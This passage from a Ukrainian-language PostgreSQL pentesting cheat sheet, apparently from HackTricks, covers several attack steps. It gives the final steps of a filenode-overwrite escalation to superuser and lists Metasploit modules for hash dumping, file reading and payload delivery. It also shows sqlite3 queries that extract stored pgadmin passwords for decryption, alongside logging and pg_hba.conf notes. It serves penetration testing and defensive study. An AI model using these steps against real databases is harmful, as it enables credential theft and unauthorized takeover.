6. Повторно завантажити відредагований filenode через функції `lo_*` і перезаписати оригінальний файл на диску
7. _(За бажанням)_ Очистити кеш таблиць у пам’яті, запустивши ресурсоємний SQL-запит
8. Тепер ви повинні мати привілеї повного суперадміністратора.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### логування

У файлі _**postgresql.conf**_ ви можете увімкнути логи postgresql, змінивши:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Потім, **перезапустіть сервіс**.

### pgadmin

[pgadmin](https://www.pgadmin.org) — платформа для адміністрування та розробки для PostgreSQL.\
Ви можете знайти **passwords** у файлі _**pgadmin4.db**_\
Ви можете розшифрувати їх, використовуючи функцію _**decrypt**_ у скрипті: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Клієнтська автентифікація в PostgreSQL керується конфігураційним файлом під назвою **pg_hba.conf**. Цей файл містить серію записів, кожен із яких вказує тип підключення, діапазон IP-адрес клієнта (якщо застосовується), назву бази даних, ім'я користувача та метод автентифікації, який слід використовувати для зіставлення підключень. Для автентифікації використовується перший запис, що відповідає типу підключення, адресі клієнта, запитуваній базі даних та імені користувача. Немає резервного варіанта у разі невдалої автентифікації. Якщо жоден запис не підходить, доступ заборонено.

Доступні методи автентифікації на основі пароля в pg_hba.conf — **md5**, **crypt** та **password**. Ці методи відрізняються тим, як передається пароль: у вигляді MD5-хешу, зашифрованого crypt або у вигляді відкритого тексту. Важливо зазначити, що метод crypt не можна використовувати з паролями, які були зашифровані в pg_authid.

## Посилання

- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
